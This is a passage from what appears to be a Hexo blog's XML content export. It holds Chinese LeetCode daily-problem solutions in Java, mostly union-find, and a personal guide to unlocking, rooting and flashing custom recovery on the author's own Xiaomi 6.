swimInWater(int[][] grid) &#123; int n = grid.length; // 记录水位高度的位置 int[][] pos = new int[n * n][2]; for (int i = 0;i &lt; n;i++) &#123; for (int j = 0;j &lt; n;j++) &#123; pos[grid[i][j]][0] = i; pos[grid[i][j]][1] = j; &#125; &#125; UF u = new UF(n * n); int[][] dir = &#123; &#123;0, 1&#125;, &#123;0, -1&#125;, &#123;1, 0&#125;, &#123;-1, 0&#125; &#125;; // 尝试 for (int i = 0;i &lt; n * n;i++) &#123; int x = pos[i][0]; int y = pos[i][1]; for (int j = 0;j &lt; dir.length;j++) &#123; int nextX = x + dir[j][0]; int nextY = y + dir[j][1]; if (nextX &gt;= 0 &amp;&amp; nextX &lt; n &amp;&amp; nextY &gt;= 0 &amp;&amp; nextY &lt; n &amp;&amp; grid[nextX][nextY] &lt;= i) &#123; u.union(x * n + y,nextX * n + nextY); &#125; &#125; if (u.isConnected(0,n * n - 1)) &#123; return i; &#125; &#125; return -1; &#125; class UF &#123; int[] parent; public UF (int n) &#123; parent = new int[n]; for (int i = 0;i &lt; n;i++) &#123; parent[i] = i; &#125; &#125; public int find(int x) &#123; if (x != parent[x]) &#123; parent[x] = find(parent[x]); &#125; return parent[x]; &#125; public void union(int x,int y) &#123; int rootX = find(x); int rootY = find(y); if (rootX == rootY) &#123; return; &#125; parent[rootX] = rootY; &#125; public boolean isConnected(int x,int y) &#123; return find(x) == find(y); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/29]]></title>
    <url>%2Fposts%2F89d82642%2F</url>
    <content type="text"><![CDATA[题目：1631. 最小体力消耗路径难度：中等 你准备参加一场远足活动。给你一个二维 rows x columns 的地图 heights ，其中 heights[row][col] 表示格子 (row, col) 的高度。一开始你在最左上角的格子 (0, 0) ，且你希望去最右下角的格子 (rows-1, columns-1) （注意下标从 0 开始编号）。你每次可以往 上 ， 下 ， 左 ， 右 四个方向之一移动，你想要找到耗费 体力 最小的一条路径。 一条路径耗费的 体力值 是路径上相邻格子之间 高度差绝对值 的 最大值 决定的。 请你返回从左上角走到右下角的最小 ** 体力消耗值** 。 示例 1： 1234输入：heights = [[1,2,2],[3,8,2],[5,3,5]]输出：2解释：路径 [1,3,5,3,5] 连续格子的差值绝对值最大为 2 。这条路径比路径 [1,2,2,2,5] 更优，因为另一条路径差值最大值为 3 。 示例 2： 123输入：heights = [[1,2,3],[3,8,4],[5,3,5]]输出：1解释：路径 [1,2,3,4,5] 的相邻格子差值绝对值最大为 1 ，比路径 [1,3,5,3,5] 更优。 示例 3： 123输入：heights = [[1,2,1,1,1],[1,2,1,2,1],[1,2,1,2,1],[1,2,1,2,1],[1,1,1,2,1]]输出：0解释：上图所示路径不需要消耗任何体力。 提示： rows == heights.length columns == heights[i].length 1 &lt;= rows, columns &lt;= 100 1 &lt;= heights[i][j] &lt;= 106 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/path-with-minimum-effort/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 还是在考察图的连通性问题 于是 并查集登场 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697class Solution &#123; public int minimumEffortPath(int[][] heights) &#123; int m = heights.length; int n = heights[0].length; List&lt;Edge&gt; edges = new ArrayList&lt;&gt;(); for (int i = 0;i &lt; m;i++) &#123; for (int j = 0;j &lt; n;j++) &#123; for (int k = 0;k &lt; dir.length;k++) &#123; int nextX = i + dir[k][0]; int nextY = j + dir[k][1]; if (nextX &gt;= 0 &amp;&amp; nextX &lt; m &amp;&amp; nextY &gt;= 0 &amp;&amp; nextY &lt; n) &#123; int s = i * n + j; int e = nextX * n + nextY; int w = Math.abs(heights[i][j] - heights[nextX][nextY]); edges.add(new Edge(s,e,w)); &#125; &#125; &#125; &#125; Collections.sort(edges); UF u = new UF(m * n); for (Edge e : edges) &#123; u.union(e.s,e.e); if (u.isConnected(0,m * n - 1)) &#123; return e.w; &#125; &#125; return 0; &#125; int[][] dir = &#123; &#123;0,-1&#125;, &#123;0,1&#125;, &#123;-1,0&#125;, &#123;1,0&#125; &#125;; class Edge implements Comparable&lt;Edge&gt; &#123; int s;// 起点 int e;// 终点 int w;// 权值 public Edge(int s,int e,int w) &#123; this.s = s; this.e = e; this.w = w; &#125; public int compareTo(Edge e) &#123; return this.w - e.w; &#125; public String toString() &#123; return String.format("[%d,%d,%d]",s,e,w); &#125; &#125; class UF &#123; int[] parent; int cnt; public UF(int n) &#123; this.cnt = n; parent = new int[n]; for (int i = 0;i &lt; n;i++) &#123; parent[i] = i; &#125; &#125; public int find(int x) &#123; if (parent[x] != x) &#123; parent[x] = find(parent[x]); &#125; return parent[x]; &#125; public void union(int x,int y) &#123; int rootX = find(x); int rootY = find(y); if (rootX == rootY) &#123; return; &#125; parent[rootX] = rootY; cnt--; &#125; public boolean isConnected(int x,int y) &#123; return find(x) == find(y); &#125; public String toString() &#123; return cnt + "," + Arrays.toString(parent); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/28]]></title>
    <url>%2Fposts%2Ffedf16d4%2F</url>
    <content type="text"><![CDATA[题目：724. 寻找数组的中心索引难度：简单 给定一个整数类型的数组 nums，请编写一个能够返回数组 *“中心索引” * 的方法。 我们是这样定义数组 ** 中心索引 ** 的：数组中心索引的左侧所有元素相加的和等于右侧所有元素相加的和。 如果数组不存在中心索引，那么我们应该返回 -1。如果数组有多个中心索引，那么我们应该返回最靠近左边的那一个。 示例 1： 123456输入：nums = [1, 7, 3, 6, 5, 6]输出：3解释：索引 3 (nums[3] = 6) 的左侧数之和 (1 + 7 + 3 = 11)，与右侧数之和 (5 + 6 = 11) 相等。同时, 3 也是第一个符合要求的中心索引。 示例 2： 12345输入：nums = [1, 2, 3]输出：-1解释：数组中不存在满足此条件的中心索引。 说明： nums 的长度范围为 [0, 10000]。 任何一个 nums[i] 将会是一个范围在 [-1000, 1000]的整数。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-pivot-index/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 缓存左边数的和 &amp; 右边数的和 即可 解题代码12345678910111213141516171819class Solution &#123; public int pivotIndex(int[] nums) &#123; int rightSum = 0; int leftSum = 0; for (int i = 0;i &lt; nums.length;i++) &#123; rightSum += nums[i]; &#125; for (int i = 0;i &lt; nums.length;i++) &#123; rightSum -= nums[i]; if (leftSum == rightSum) &#123; return i; &#125; leftSum += nums[i]; &#125; return -1; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[小米6钉子户折腾日记（一）]]></title>
    <url>%2Fposts%2F574b2b2e%2F</url>
    <content type="text"><![CDATA[篇一：初级折腾 前言 先谈一谈我和小米的缘分吧，自从14年，我购入了属于我自己的第一台小米手机——小米note之后，就一直在用小米系列的手机产品，我用过的产品线大概是这样的小米note-&gt;小米5-&gt;小米max-&gt;小米6-&gt;小米CC9（目前），至于我为什么要买小米系的产品，我认为原因有两点吧，第一，miui确实大而全并且好玩，发烧友们应该都懂；第二，我应该算是雷军的粉丝吧，国内科技圈我最为崇拜的两个人，雷军和求伯君 再谈一谈，我手里这台小米6吧，17年首发提前批F码通道到手的，说实话，我自己也没想到，它坚持到了现在，并且目前还保持着较高的流畅度，因为一直保护的还算比较好，成色比较新（至少85新吧，仅不锈钢中框掉了一点点漆），截止到目前为止，没有换过手机的任何零部件，我都用它干过些什么呢？老实说，在它作为我的主力机的时候，我并没有对它进行任何的折腾，就纯粹的正常使用，我对它的折腾开始于，它作为备用机的时候，作为一个发烧友（可能不太合格） 折腾 当然包括但不限于解锁，刷机，root，recovery，magisk，xposed，魔改官方ROM，魔改官方apk等操作 实际上，就我个人而言，折腾应该算作是我的兴趣爱好吧，生命在于折腾 说明主要回答下面这几个问题： 这个系列的文章仅适用于小米6钉子户吗？答：我在这个系列的文章中仅会以小米6手机举例：包括所有实例，步骤等。但是折腾这东西吧，思路其实是适用于很多方面，只要你有一颗想做极客的心，我认为都可以从这个系列的文章中学到一些东西 这篇文章的内容包括哪些？答：大概有： 解锁bl 刷第三方recovery 刷入root 刷入magisk 刷入xposed 初级救砖 为什么这篇文章是初级篇？答：因为我认为以上所列出的所有操作，均是初级操作，换言之，就是大部分人都会的东西（毕竟各路教程满天飞），没什么好稀奇的，也谈不上很牛的技术，如果非要说牛的话，我认为，造轮子的大佬们牛，努力吧，也许这辈子都无法到达那个高度，但至少我们曾经为此努力过，不是吗？ 后面会有高级篇吗？答：这是系列文章，后面自然会出高级篇（提前给自己挖坑。不知道啥时候埋） 高级篇的内容包括哪些？答：大概有 反编译，魔改系统apk 魔改ROM 移植ROM 高级救砖 各种自定义 开始请严格按照目录依次操作 解锁bl就参考官方吧，很多时候官方的东西，会给我们很多的灵感，遇到问题的时候，多翻一翻官方的东西，也许有意外惊喜，至于解锁教程，官方的教程已经足够详细，不再多说，如果实在不会，请访问官方教程 刷第三方recovery提到第三方recovery就不得不提twrp，虽然我最后使用的第三方recovery不是twrp，而是OrangeFox，但是刷入OrangeFox前，需要先刷入其他的第三方recovery，于是还是得刷twrp 需要准备的工具： adb fastboot 一条数据线 如果你电脑上有Android Sdk，你会发现这些都是集成好的，为了方便使用，你需要做的大概只有把那个目录加入到环境变量中 需要准备的文件： twrp-3.5.0_9-0-sagit.imgOrangeFox-sagit-stable@R10.0.zip 步骤 手机设置中打开开发者选项，打开USB调试和USB调试安全选项，如果你手机没有开发者选项这个设置，快速连续点击设置-&gt;我的设备-&gt;全部参数-&gt;miui版本十次 手机开机状态下，数据线连上电脑，执行命令adb reboot bootloader或者手机关机状态下，同时按住开机键和音量上键，进入fastboot，看到米兔正在修理机器人界面 在你下载好的文件目录下，打开cmd，执行命令，fastboot flash recovery twrp-3.5.0_9-0-sagit.img 刷完之后，不要直接开机，不然会自动恢复官方的recovery，保持关机状态下，同时按住开机键和音量上键，应该会进入twrp的recovery 如果你有密码，进入recovery后会要求输入密码，验证通过后这时候adb会自动连接上，把OrangeFox的zip复制到手机上，然后使用twrp的install功能，安装zip 完成后重启，第三方recovery就刷好了 one the more，如果你不喜欢英文，可以在设置中切换为中文 这里稍微提一下为啥要使用OrangeFox的recovery，因为这家的recovery对miui官方包的支持可能是最好的吧，它支持官方包的ota等，我个人比较喜欢官方包，在官方包的基础上魔改一些东西，自定义 刷入root这个相当的简单了，如果你喜欢官方给你的root，你可以选择刷入miui官方的开发版系统自带的root包，这个过程可以自动完成，只需要在手机管家-&gt;应用管理-&gt;权限-&gt;开启root权限即可，如果你不喜欢官方给你的，刷入magisk是另一种选择 刷入magisk直接下载最新的Magisk.zip，然后放入手机根目录，重启到recovery，安装即可 刷入xposed官方的xposed最高只支持到android 8，如果你是8及其以下，可以选择官方的，不是的话，就选择Edxposed吧 需要准备的文件： 步骤 进入recovery，刷入magisk 开机，在magisk manager应用中安装Riru模块，可能需要一个梯子 进入recovery，刷入Edxposed 开机，安装Edxposed Manager enjoy it!!! 初级救砖其实就是卡刷和线刷救砖，预备好官方包，在无限重启 无法开机等异常状态时，重新刷入官方包，使之回归到正常状态，不再过多赘述 我预备了这四个包，既有卡刷包，也有线刷包 总结初级篇所有过程均不复杂，毕竟工具确实好用，按步骤来基本不会出问题 题外话，不建议使用未知来源或者不开源的magisk或者xposed模块，so dangerous 其实这篇文章里面所有内容，均有人做好了相关的ROM了甚至他们给的功能增强更强，而安装基本也就是一键操作，很方便，那为什么我不直接使用他们做好的呢？答案其实很显然：推广太多并且极度危险，另外 我喜欢自己魔改，包括在写这篇文章中所安装好magisk和xposed，它们很好玩，很强，但其实我不需要他们，为什么呢？因为他们给的太多了，而我需要的并没有这么多，由此将会引出高级篇，各种自定义修改，魔改系统等等 只有你自己才知道你需要的到底是什么，但好多时候 其实连你自己都不知道 敬请期待高级篇]]></content>
      <categories>
        <category>发烧友折腾日记</category>
      </categories>
      <tags>
        <tag>小米6</tag>
        <tag>钉子户</tag>
        <tag>折腾</tag>
        <tag>解锁bl</tag>
        <tag>刷recovery</tag>
        <tag>极客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/27]]></title>
    <url>%2Fposts%2F6e600b45%2F</url>
    <content type="text"><![CDATA[题目：1579. 保证图可完全遍历难度：困难 Alice 和 Bob 共有一个无向图，其中包含 n 个节点和 3 种类型的边： 类型 1：只能由 Alice 遍历。 类型 2：只能由 Bob 遍历。 类型 3：Alice 和 Bob 都可以遍历。 给你一个数组 edges ，其中 edges[i] = [typei, ui, vi] 表示节点 ui 和 vi 之间存在类型为 typei 的双向边。请你在保证图仍能够被 Alice和 Bob 完全遍历的前提下，找出可以删除的最大边数。如果从任何节点开始，Alice 和 Bob 都可以到达所有其他节点，则认为图是可以完全遍历的。 返回可以删除的最大边数，如果 Alice 和 Bob 无法完全遍历图，则返回 -1 。 示例 1： 123输入：n = 4, edges = [[3,1,2],[3,2,3],[1,1,3],[1,2,4],[1,1,2],[2,3,4]]输出：2解释：如果删除 [1,1,2] 和 [1,1,3] 这两条边，Alice 和 Bob 仍然可以完全遍历这个图。再删除任何其他的边都无法保证图可以完全遍历。所以可以删除的最大边数是 2 。 示例 2： 123输入：n = 4, edges = [[3,1,2],[3,2,3],[1,1,4],[2,1,4]]输出：0解释：注意，删除任何一条边都会使 Alice 和 Bob 无法完全遍历这个图。 示例 3： 123输入：n = 4, edges = [[3,2,3],[1,1,2],[2,3,4]]输出：-1解释：在当前图中，Alice 无法从其他节点到达节点 4 。类似地，Bob 也不能达到节点 1 。因此，图无法完全遍历。 提示： 1 &lt;= n &lt;= 10^5 1 &lt;= edges.length &lt;= min(10^5, 3 * n * (n-1) / 2) edges[i].length == 3 1 &lt;= edges[i][0] &lt;= 3 1 &lt;= edges[i][1] &lt; edges[i][2] &lt;= n 所有元组 (typei, ui, vi) 互不相同 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/remove-max-number-of-edges-to-keep-graph-fully-traversable/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 删除的最大边数就是保留的最小边数，因此优先保留公共边，然后考虑独占边 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172class Solution &#123; public int maxNumEdgesToRemove(int n, int[][] edges) &#123; int ans = 0; UF a = new UF(n); UF b = new UF(n); // 考虑公共边 for (int[] e : edges) &#123; if (e[0] == 3) &#123; if (!a.union(e[1],e[2])) &#123; ans++; &#125; else &#123; b.union(e[1],e[2]); &#125; &#125; &#125; // 考虑独占边 for (int[] e: edges) &#123; if (e[0] == 1) &#123; if (!a.union(e[1],e[2])) &#123; ans++; &#125; &#125; else if (e[0] == 2) &#123; if (!b.union(e[1],e[2])) &#123; ans++; &#125; &#125; &#125; if (a.cnt != 1 || b.cnt != 1) &#123; return -1; &#125; return ans; &#125; class UF &#123; int[] parents; int cnt; public UF(int n) &#123; cnt = n; parents = new int[n + 1]; for (int i = 1;i &lt;= n;i++) &#123; parents[i] = i; &#125; &#125; public int find(int x) &#123; if (x != parents[x]) &#123; parents[x] = find(parents[x]); &#125; return parents[x]; &#125; public boolean union(int x,int y) &#123; int rootX = find(x); int rootY = find(y); if (rootX == rootY) &#123; return false; &#125; cnt--; parents[rootX] = rootY; return true; &#125; public String toString() &#123; return cnt + "," + Arrays.toString(parents); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>贪心算法</tag>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/26]]></title>
    <url>%2Fposts%2F19673bd3%2F</url>
    <content type="text"><![CDATA[题目：1128. 等价多米诺骨牌对的数量难度：简单 给你一个由一些多米诺骨牌组成的列表 dominoes。 如果其中某一张多米诺骨牌可以通过旋转 0 度或 180 度得到另一张多米诺骨牌，我们就认为这两张牌是等价的。 形式上，dominoes[i] = [a, b] 和 dominoes[j] = [c, d] 等价的前提是 a==c 且 b==d，或是 a==d 且 b==c。 在 0 &lt;= i &lt; j &lt; dominoes.length 的前提下，找出满足 dominoes[i] 和 dominoes[j] 等价的骨牌对 (i, j) 的数量。 示例： 12输入：dominoes = [[1,2],[2,1],[3,4],[5,6]]输出：1 提示： 1 &lt;= dominoes.length &lt;= 40000 1 &lt;= dominoes[i][j] &lt;= 9 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/number-of-equivalent-domino-pairs/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 打表 解题代码123456789101112131415161718class Solution &#123; public int numEquivDominoPairs(int[][] dominoes) &#123; int ans = 0; int[][] map = new int[10][10]; for (int[] x : dominoes) &#123; if (x[0] &lt; x[1]) &#123; ans += map[x[0]][x[1]]; map[x[0]][x[1]]++; &#125; else &#123; ans += map[x[1]][x[0]]; map[x[1]][x[0]]++; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/25]]></title>
    <url>%2Fposts%2F806e6a69%2F</url>
    <content type="text"><![CDATA[题目：959. 由斜杠划分区域难度：中等 在由 1 x 1 方格组成的 N x N 网格 grid 中，每个 1 x 1 方块由 /、\ 或空格构成。这些字符会将方块划分为一些共边的区域。 （请注意，反斜杠字符是转义的，因此 \ 用 “\“ 表示。）。 返回区域的数目。 示例 1： 1234567输入：[ &quot; /&quot;, &quot;/ &quot;]输出：2解释：2x2 网格如下： 示例 2： 1234567输入：[ &quot; /&quot;, &quot; &quot;]输出：1解释：2x2 网格如下： 示例 3： 12345678输入：[ &quot;\\/&quot;, &quot;/\\&quot;]输出：4解释：（回想一下，因为 \ 字符是转义的，所以 &quot;\\/&quot; 表示 \/，而 &quot;/\\&quot; 表示 /\。）2x2 网格如下： 示例 4： 12345678输入：[ &quot;/\\&quot;, &quot;\\/&quot;]输出：5解释：（回想一下，因为 \ 字符是转义的，所以 &quot;/\\&quot; 表示 /\，而 &quot;\\/&quot; 表示 \/。）2x2 网格如下： 示例 5： 1234567输入：[ &quot;//&quot;, &quot;/ &quot;]输出：3解释：2x2 网格如下： 提示： 1 &lt;= grid.length == grid[0].length &lt;= 30 grid[i][j] 是 ‘/‘、’&#39;、或 ‘ ‘。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/regions-cut-by-slashes/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 本质上还是求连通分量的问题 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869class Solution &#123; public int regionsBySlashes(String[] grid) &#123; int n = grid.length; int size = 4 * n * n; UF u = new UF(size); for (int i = 0;i &lt; n;i++) &#123; char[] row = grid[i].toCharArray(); for (int j = 0;j &lt; n;j++) &#123; int index = 4 * (i * n + j); char ch = row[j]; switch(ch) &#123; case '/': u.union(index, index + 3); u.union(index + 1, index + 2); break; case '\\': u.union(index, index + 1); u.union(index + 2, index + 3); break; case ' ': u.union(index, index + 1); u.union(index + 1, index + 2); u.union(index + 2, index + 3); break; &#125; if (j + 1 &lt; n) &#123; u.union(index + 1, 4 * (i * n + j + 1) + 3); &#125; if (i + 1 &lt; n) &#123; u.union(index + 2, 4 * ((i + 1) * n + j)); &#125; &#125; &#125; return u.cnt; &#125; class UF &#123; int cnt; int[] p; public UF(int n) &#123; cnt = n; p = new int[n]; for (int i = 0;i &lt; n;i++) &#123; p[i] = i; &#125; &#125; public int find(int x) &#123; if (x != p[x]) &#123; p[x] = find(p[x]); &#125; return p[x]; &#125; public void union(int x,int y) &#123; int rX = find(x); int rY = find(y); if (rX == rY) &#123; return; &#125; cnt--; p[rX] = rY; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/24]]></title>
    <url>%2Fposts%2Ff7695aff%2F</url>
    <content type="text"><![CDATA[题目：674. 最长连续递增序列难度：简单 给定一个未经排序的整数数组，找到最长且 ** 连续递增的子序列** ，并返回该序列的长度。 连续递增的子序列 可以由两个下标 l 和 r（l &lt; r）确定，如果对于每个 l &lt;= i &lt; r，都有 nums[i] &lt; nums[i + 1] ，那么子序列 [nums[l], nums[l + 1], …, nums[r - 1], nums[r]] 就是连续递增子序列。 示例 1： 1234输入：nums = [1,3,5,4,7]输出：3解释：最长连续递增序列是 [1,3,5], 长度为3。尽管 [1,3,5,7] 也是升序的子序列, 但它不是连续的，因为 5 和 7 在原数组里被 4 隔开。 示例 2： 123输入：nums = [2,2,2,2,2]输出：1解释：最长连续递增序列是 [2], 长度为1。 提示： 0 &lt;= nums.length &lt;= 104 -109 &lt;= nums[i] &lt;= 109 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/longest-continuous-increasing-subsequence/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 没啥好说的 直接上代码吧 解题代码遍历 1234567891011121314151617181920class Solution &#123; public int findLengthOfLCIS(int[] nums) &#123; int ans = 0; for (int i = 0;i &lt; nums.length;i++) &#123; int j = i + 1; while (j &lt; nums.length &amp;&amp; nums[j] &gt; nums[j - 1]) &#123; j++; &#125; ans = Math.max(ans,j - i); if (i - j &gt; 1) &#123; i = j; &#125; &#125; return ans; &#125;&#125; 贪心 1234567891011121314class Solution &#123; public int findLengthOfLCIS(int[] nums) &#123; int ans = 0; int start = 0; for (int i = 0;i &lt; nums.length;i++) &#123; if (i &gt; 0 &amp;&amp; nums[i] &lt;= nums[i - 1]) &#123; start = i; &#125; ans = Math.max(ans,i - start + 1); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/23]]></title>
    <url>%2Fposts%2F690dcf5c%2F</url>
    <content type="text"><![CDATA[题目：1319. 连通网络的操作次数难度：中等 用以太网线缆将 n 台计算机连接成一个网络，计算机的编号从 0 到 n-1。线缆用 connections 表示，其中 connections[i] = [a, b] 连接了计算机 a 和 b。 网络中的任何一台计算机都可以通过网络直接或者间接访问同一个网络中其他任意一台计算机。 给你这个计算机网络的初始布线 connections，你可以拔开任意两台直连计算机之间的线缆，并用它连接一对未直连的计算机。请你计算并返回使所有计算机都连通所需的最少操作次数。如果不可能，则返回 -1 。 示例 1： 123输入：n = 4, connections = [[0,1],[0,2],[1,2]]输出：1解释：拔下计算机 1 和 2 之间的线缆，并将它插到计算机 1 和 3 上。 示例 2： 12输入：n = 6, connections = [[0,1],[0,2],[0,3],[1,2],[1,3]]输出：2 示例 3： 123输入：n = 6, connections = [[0,1],[0,2],[0,3],[1,2]]输出：-1解释：线缆数量不足。 示例 4： 12输入：n = 5, connections = [[0,1],[0,2],[3,4],[2,3]]输出：0 提示： 1 &lt;= n &lt;= 10^5 1 &lt;= connections.length &lt;= min(n*(n-1)/2, 10^5) connections[i].length == 2 0 &lt;= connections[i][0], connections[i][1] &lt; n connections[i][0] != connections[i][1] 没有重复的连接。 两台计算机不会通过多条线缆连接。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/number-of-operations-to-make-network-connected/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 其实这题本质上还是在求连通分量的数目，没说的，并查集揍ta 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class Solution &#123; public int makeConnected(int n, int[][] connections) &#123; if (n - 1 &gt; connections.length) &#123; return -1; &#125; UF u = new UF(n); for (int[] c : connections) &#123; u.union(c[0],c[1]); &#125; // System.out.println(u); return u.cnt - 1; &#125; class UF &#123; int cnt; int[] parents; public UF(int n) &#123; cnt = n; parents = new int[n]; for (int i = 0;i &lt; n;i++) &#123; parents[i] = i; &#125; &#125; public int find(int x) &#123; if (x != parents[x]) &#123; parents[x] = find(parents[x]); &#125; return parents[x]; &#125; public void union(int x,int y) &#123; int rootX = find(x); int rootY = find(y); if (rootX == rootY) &#123; return; &#125; cnt--; parents[rootX] = rootY; &#125; public String toString() &#123; return cnt + "," + Arrays.toString(parents); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/22]]></title>
    <url>%2Fposts%2F1e0affca%2F</url>
    <content type="text"><![CDATA[题目：989. 数组形式的整数加法难度：简单 对于非负整数 X 而言，X 的数组形式是每位数字按从左到右的顺序形成的数组。例如，如果 X = 1231，那么其数组形式为 [1,2,3,1]。 给定非负整数 X 的数组形式 A，返回整数 X+K 的数组形式。 示例 1： 123输入：A = [1,2,0,0], K = 34输出：[1,2,3,4]解释：1200 + 34 = 1234 示例 2： 123输入：A = [2,7,4], K = 181输出：[4,5,5]解释：274 + 181 = 455 示例 3： 123输入：A = [2,1,5], K = 806输出：[1,0,2,1]解释：215 + 806 = 1021 示例 4： 123输入：A = [9,9,9,9,9,9,9,9,9,9], K = 1输出：[1,0,0,0,0,0,0,0,0,0,0]解释：9999999999 + 1 = 10000000000 提示： 1 &lt;= A.length &lt;= 10000 0 &lt;= A[i] &lt;= 9 0 &lt;= K &lt;= 10000 如果 A.length &gt; 1，那么 A[0] != 0 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/add-to-array-form-of-integer/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 注意控制好进位即可 解题代码123456789101112131415161718192021222324252627282930class Solution &#123; public List&lt;Integer&gt; addToArrayForm(int[] A, int K) &#123; int p = A.length - 1; List&lt;Integer&gt; ans = new LinkedList&lt;&gt;(); int flag = 0; while (p &gt;= 0) &#123; int m = K % 10; K /= 10; int a = flag + m + A[p]; ans.add(0,a % 10); flag = a / 10; p--; &#125; while (K != 0) &#123; int m = K % 10; K /= 10; int a = flag + m; ans.add(0,a % 10); flag = a / 10; &#125; if (flag != 0) &#123; ans.add(0,flag); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/20]]></title>
    <url>%2Fposts%2Ff0049ee6%2F</url>
    <content type="text"><![CDATA[题目：628. 三个数的最大乘积难度：简单 给定一个整型数组，在数组中找出由三个数组成的最大乘积，并输出这个乘积。 示例 1: 12输入: [1,2,3]输出: 6 示例 2: 12输入: [1,2,3,4]输出: 24 注意: 给定的整型数组长度范围是[3,104]，数组中所有的元素范围是[-1000, 1000]。 输入的数组中任意三个数的乘积不会超出32位有符号整数的范围。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/maximum-product-of-three-numbers/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 扫描一次，找到最大的元素max1，第二大的元素max2，第三大的元素max3，以及最小的元素min1和第二小的元素min2，三个数乘积的最大值就是max1 * max2 * max3和max1 * min1 * min2这二者的最大值 解题代码123456789101112131415161718192021222324252627282930313233class Solution &#123; public int maximumProduct(int[] nums) &#123; int max1 = -1001; int max2 = max1; int max3 = max1; int min1 = 1001; int min2 = min1; for (int i = 0;i &lt; nums.length;i++) &#123; int n = nums[i]; if (n &gt; max1) &#123; max3 = max2; max2 = max1; max1 = n; &#125; else if (n &gt; max2) &#123; max3 = max2; max2 = n; &#125; else if (n &gt; max3) &#123; max3 = n; &#125; if (n &lt; min1) &#123; min2 = min1; min1 = n; &#125; else if (n &lt; min2) &#123; min2 = n; &#125; &#125; return Math.max(max1 * max2 * max3,max1 * min1 * min2); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/1/19]]></title>
    <url>%2Fposts%2Fa2f57581%2F</url>
